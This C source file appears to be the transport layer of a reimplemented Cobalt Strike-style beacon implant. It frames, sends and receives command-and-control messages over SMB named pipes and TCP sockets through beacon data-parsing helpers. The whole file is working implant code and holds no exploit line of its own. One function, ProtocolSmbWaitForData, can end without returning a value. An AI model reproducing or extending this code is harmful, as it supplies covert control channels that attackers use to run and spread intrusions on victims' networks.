#include "pch.h"

#include "protocol.h"

#include "beacon.h"
#include "settings.h"

int ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
{
	int read, totalRead;
	for(totalRead = 0; totalRead < length; totalRead += read)
	{
		if (!ReadFile(channel, buffer + totalRead, length - totalRead, &read, NULL))
			return -1;

		if (read == 0)
			return -1;
	}

	if (totalRead != length)
		return -1;

	return totalRead;
}

int ProtocolTcpSocketRead(SOCKET channel, char* buffer, int length)
{
	int read, totalRead;
	for (totalRead = 0; totalRead < length; totalRead += read)
	{
		read = recv(channel, buffer + totalRead, length - totalRead, 0);
		if (read == SOCKET_ERROR)
			return -1;

		if (read == 0)
			break;
	}

	if (totalRead != length)
		return -1;

	return totalRead;
}

BOOL ProtocolSmbPipeWrite(HANDLE hFile, char* buffer, int length)
{
    DWORD wrote;

    // Check if size is greater than 0
    for (DWORD totalWrote = 0; totalWrote < length; totalWrote += wrote) {
        // Calculate the number of bytes to be written in the current iteration
        const DWORD toWrite = min(length - totalWrote, 0x2000);


        // Check if the write operation was successful
        if (!WriteFile(hFile, buffer + totalWrote, toWrite, &wrote, NULL)) {
            return FALSE;
        }
    }

    return TRUE;
}

BOOL ProtocolTcpSocketWrite(SOCKET channel, char* buffer, int length)
{
	if(length == 0)
		return TRUE;

	return send(channel, buffer, length, 0) != SOCKET_ERROR;
}

char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
{
	datap parser;
	BeaconDataParse(&parser, setting, headerSize);
	SHORT headerLength = BeaconDataShort(&parser);
	*pHeaderLength = headerLength;
	char* header = BeaconDataPtr(&parser, headerLength);
	*(int*)(header + *pHeaderLength - sizeof(int)) = headerSize;
	return header;
}

int ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, 0, &headerSize);
	int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
		return -1;

	int dataSize = *(int*)(header + headerSize - sizeof(int));
	if ( dataSize < 0 || dataSize > length)
		return -1;

	return ProtocolSmbPipeRead(protocol->channel.handle, buffer, dataSize);
}

int ProtocolTcpRead(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, 0, &headerSize);
	int totalHeaderRead = ProtocolTcpSocketRead(protocol->channel.socket, header, headerSize);
	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
		return -1;

	int dataSize = *(int*)(header + headerSize - sizeof(int));
	if (dataSize < 0 || dataSize > length)
		return -1;

	return ProtocolTcpSocketRead(protocol->channel.socket, buffer, dataSize);
}

BOOL ProtocolTcpWrite(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, length, &headerSize);
	if (!ProtocolTcpSocketWrite(protocol->channel.socket, header, headerSize))
		return FALSE;

	return ProtocolTcpSocketWrite(protocol->channel.socket, buffer, length);
}

BOOL ProtocolSmbWrite(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, length, &headerSize);
	if (!ProtocolSmbPipeWrite(protocol->channel.handle, header, headerSize))
		return FALSE;

	return ProtocolSmbPipeWrite(protocol->channel.handle, buffer, length);
}

void ProtocolSmbClose(PROTOCOL* protocol)
{
	DisconnectNamedPipe(protocol->channel.handle);
	CloseHandle(protocol->channel.handle);
}

void ProtocolSmbFlush(PROTOCOL* protocol)
{
	FlushFileBuffers(protocol->channel.handle);
}

BOOL ProtocolSmbWaitForData(PROTOCOL* protocol, DWORD waitTime)
{
	DWORD timeout = GetTickCount() + waitTime;
	DWORD available;

	while (GetTickCount() < timeout)
	{
		if (!PeekNamedPipe(protocol->channel.handle, NULL, 0, NULL, &available, NULL))
			return FALSE;

		if (available)
			return TRUE;

		Sleep(10);
	}
}

PROTOCOL* ProtocolSmbInit(PROTOCOL* protocol, HANDLE handle)
{
	protocol->channel.handle = handle;
	protocol->read = ProtocolSmbRead;
	protocol->write = ProtocolSmbWrite;
	protocol->close = ProtocolSmbClose;
	protocol->flush = ProtocolSmbFlush;
	protocol->waitForData = ProtocolSmbWaitForData;
	return protocol;
}